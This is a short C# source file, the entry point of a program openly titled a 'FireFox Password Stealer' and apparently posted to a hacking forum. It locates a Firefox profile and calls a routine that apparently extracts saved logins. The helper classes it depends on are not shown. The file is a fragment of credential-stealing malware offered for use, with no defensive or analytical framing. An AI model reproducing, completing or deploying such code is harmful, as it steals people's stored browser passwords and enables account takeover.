using System;

namespace FireFoxTools
{
    internal class Program
    {
        private static void Main()
        {
            Console.Title = "New FireFox Password Stealer by Antlion [XakFor.Net]";
            Console.WriteLine(FireFoxPath.GetRandomFF());
           // DecryptTools.InitDelegates();
            GetSignons.Password();

            Console.ReadKey();
        }
    }
}